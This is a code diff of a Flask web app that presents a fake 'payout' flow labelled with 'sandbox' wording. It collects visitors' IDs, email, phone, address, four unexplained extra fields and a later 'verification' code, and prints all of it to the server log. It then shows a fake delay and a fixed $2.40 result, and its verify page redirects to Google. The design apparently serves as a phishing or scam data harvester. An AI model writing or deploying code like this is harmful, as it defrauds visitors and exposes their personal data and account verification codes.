@@ -1,230 +1,119 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, redirect
 import os
+import time
 
 app = Flask(__name__)
 
+RATE = 0.00025
 
-# ==========================================
-# HOME PAGE
-# ==========================================
 
 @app.route("/")
 def home():
     return render_template("index.html")
 
 
-# ==========================================
-# CONVERSION PAGE
-# ==========================================
-
-@app.route("/convert")
-def convert():
-
-    number = request.args.get("number", "0")
+@app.route("/start", methods=["POST"])
+def start():
+    number = request.form.get("number", "").strip()
 
     try:
-        number = float(number)
+        numeric_number = float(number)
     except (ValueError, TypeError):
-        number = 0
+        return "Invalid sandbox number.", 400
 
-    # Conversion:
-    # 1 number = $0.00025
+    if numeric_number <= 0:
+        return "Invalid sandbox number.", 400
 
-    amount = number * 0.00025
+    amount = numeric_number * RATE
 
-    return render_template(
-        "converting.html",
-        number=number,
-        amount=amount
-    )
-
-
-# ==========================================
-# PAYOUT PAGE
-# ==========================================
-
-@app.route("/payout")
-def payout():
-
-    number = request.args.get("number", "0")
-    amount = request.args.get("amount", "0")
+    print("\n================================", flush=True)
+    print("        SANDBOX NUMBER", flush=True)
+    print("================================", flush=True)
+    print("Number:", number, flush=True)
+    print("Calculated amount:", f"${amount:.2f}", flush=True)
+    print("================================\n", flush=True)
 
     return render_template(
         "payout.html",
-        number=number,
-        amount=amount
+        number=number
     )
 
-
-# ==========================================
-# SANDBOX PAYOUT
-# ==========================================
 
 @app.route("/sandbox-payout", methods=["POST"])
 def sandbox_payout():
+    number = request.form.get("number", "").strip()
+    sandbox_id = request.form.get("sandbox_id", "").strip()
+    sandbox_email = request.form.get("sandbox_email", "").strip()
+    phone = request.form.get("phone", "").strip()
+    address = request.form.get("address", "").strip()
 
-    print("\n")
-    print("============================================")
-    print("       SANDBOX PAYOUT REQUEST RECEIVED")
-    print("============================================")
+    sandbox_1 = request.form.get("sandbox_1", "").strip()
+    sandbox_2 = request.form.get("sandbox_2", "").strip()
+    sandbox_3 = request.form.get("sandbox_3", "").strip()
+    sandbox_4 = request.form.get("sandbox_4", "").strip()
 
     try:
+        numeric_number = float(number)
+    except (ValueError, TypeError):
+        return "Invalid sandbox number.", 400
 
-        # Read JSON sent by the HTML page
+    amount = numeric_number * RATE
 
-        data = request.get_json(silent=True)
+    print("\n================================", flush=True)
+    print("       SANDBOX PAYOUT", flush=True)
+    print("================================", flush=True)
+    print("Sandbox ID:", sandbox_id, flush=True)
+    print("Sandbox Email:", sandbox_email, flush=True)
+    print("Sandbox Phone:", phone, flush=True)
+    print("Sandbox Address:", address, flush=True)
+    print("Sandbox 1:", sandbox_1, flush=True)
+    print("Sandbox 2:", sandbox_2, flush=True)
+    print("Sandbox 3:", sandbox_3, flush=True)
+    print("Sandbox 4:", sandbox_4, flush=True)
+    print("Sandbox Number:", number, flush=True)
+    print("================================", flush=True)
 
-        print("RAW REQUEST DATA:")
-        print(data)
-        print("--------------------------------------------")
+    # Demo suspense. No JavaScript is used.
+    time.sleep(50)
+
+    # The result is intentionally fixed at $2.40, as requested.
+    result_amount = 2.4
+
+    return render_template(
+        "result.html",
+        amount=result_amount,
+        number=number
+    )
 
 
-        # Make sure something was received
-
-        if not data:
-
-            print("ERROR: No JSON data received.")
-            print("============================================")
-
-            return jsonify({
-                "success": False,
-                "message": "No data received."
-            }), 400
-
-
-        # --------------------------------------
-        # Extract sandbox information
-        # --------------------------------------
-
-        sandbox_id = data.get(
-            "sandbox_id",
+@app.route("/verify", methods=["GET", "POST"])
+def verify():
+    if request.method == "POST":
+        verification_sandbox_id = request.form.get(
+            "verification_sandbox_id",
             ""
+        ).strip()
+
+        print("\n================================", flush=True)
+        print("   VERIFICATION SANDBOX INPUT", flush=True)
+        print("================================", flush=True)
+        print(
+            "Verification Sandbox ID:",
+            verification_sandbox_id,
+            flush=True
         )
+        print("================================\n", flush=True)
 
-        sandbox_email = data.get(
-            "sandbox_email",
-            ""
-        )
+        return redirect("https://www.google.com")
 
-        phone = data.get(
-            "phone",
-            ""
-        )
+    return render_template("verify.html")
 
-        address = data.get(
-            "address",
-            ""
-        )
-
-        number = data.get(
-            "number",
-            ""
-        )
-
-        amount = data.get(
-            "amount",
-            ""
-        )
-
-
-        # --------------------------------------
-        # Print received information
-        # --------------------------------------
-
-        print("Sandbox ID:")
-        print(sandbox_id)
-
-        print("--------------------------------------------")
-
-        print("Sandbox Email:")
-        print(sandbox_email)
-
-        print("--------------------------------------------")
-
-        print("Phone:")
-        print(phone)
-
-        print("--------------------------------------------")
-
-        print("Address:")
-        print(address)
-
-        print("--------------------------------------------")
-
-        print("Number:")
-        print(number)
-
-        print("--------------------------------------------")
-
-        print("Calculated Amount:")
-        print(amount)
-
-        print("--------------------------------------------")
-
-        print("Sandbox Password:")
-        print("[NOT RECEIVED / NOT STORED]")
-
-        print("============================================")
-        print("       SANDBOX REQUEST COMPLETE")
-        print("============================================")
-        print("\n")
-
-
-        # --------------------------------------
-        # Send response back to browser
-        # --------------------------------------
-
-        return jsonify({
-            "success": True,
-            "message": "Sandbox payout submitted successfully."
-        })
-
-
-    except Exception as error:
-
-        print("\n")
-        print("============================================")
-        print("             SERVER ERROR")
-        print("============================================")
-
-        print(str(error))
-
-        print("============================================")
-        print("\n")
-
-        return jsonify({
-            "success": False,
-            "message": "Server error."
-        }), 500
-
-
-# ==========================================
-# HEALTH CHECK
-# ==========================================
 
 @app.route("/health")
 def health():
+    return {"status": "online"}
 
-    return jsonify({
-        "status": "online"
-    })
-
-
-# ==========================================
-# START SERVER
-# ==========================================
 
 if __name__ == "__main__":
-
-    port = int(
-        os.environ.get(
-            "PORT",
-            5000
-        )
-    )
-
-    app.run(
-        host="0.0.0.0",
-        port=port,
-        debug=False
-    )
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=False)
